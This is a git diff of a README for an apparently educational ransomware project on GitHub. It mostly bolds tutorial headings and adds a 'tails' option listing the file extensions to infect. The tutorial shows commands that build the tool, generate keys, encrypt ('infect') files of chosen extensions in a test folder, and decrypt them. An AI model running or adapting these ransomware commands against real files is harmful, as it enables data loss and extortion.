@@ -40,15 +40,15 @@ These instructions will get you a copy of the project up and running on your loc
 
 ### Tutorial
 
-1. Clone git with the command below.
+1. **Clone git with the command below.**
 
 	```bash
 	git clone https://github.com/da-huin/ransomware
 	```
 
-1. Go to the cloned folder in `console` or `bash`.
+1. **Go to the cloned folder in `console` or `bash`.**
 
-1. Build with the command below.
+1. **Build with the command below.**
 	
 	```bash
 	cd ransomware
@@ -56,7 +56,7 @@ These instructions will get you a copy of the project up and running on your loc
 	cd ..
 	```
 
-1. Check the folders to be infected.
+1. **Check the folders to be infected.**
 
 	path: `your_cloned_directory_path/test/area`
 	```
@@ -92,13 +92,13 @@ These instructions will get you a copy of the project up and running on your loc
 	./Videos:
 	'Beach - 42894.mp4'  'Cave - 45340.mp4'  'Nature - 31377.mp4'
 	```
-1. Move test directory with the command below.
+1. **Move test directory with the command below.**
 
 	```bash
 	cd test
 	```
 
-1. Keygen with the command below.
+1. **Keygen with the command below.**
 
 	* public key require encryption, private key require decryption.
 
@@ -113,7 +113,7 @@ These instructions will get you a copy of the project up and running on your loc
 	public.key and private.key generated.
 	```
 
-1. Infect with the command below.
+1. **Infect with the command below.**
 
 	```bash
 	ransomware.exe -kind encrypt -area ./area -keypath public.key .jpg .txt .mp3
@@ -155,11 +155,11 @@ These instructions will get you a copy of the project up and running on your loc
 	encrypted.
 	```
 
-1. Check the infected folder.
+1. **Check the infected folder.**
 
 	path: `your_cloned_directory_path/test/area`
 
-1. Decrypt with the command below.
+1. **Decrypt with the command below.**
 
 	```bash
 	ransomware.exe -kind decrypt -area ./area -keypath private.key
@@ -218,6 +218,14 @@ These instructions will get you a copy of the project up and running on your loc
 * `message`: str (default "hello")
 
 	Messages to be written to the infected file. 
+
+* `tails`: ...
+
+	List of extensions to be infected
+	
+	```
+	ransomware.exe ... -message=hello .txt .pdf .png .jpg
+	```
 
 ## 🎉 Acknowledgements <a name = "acknowledgement"></a>
 
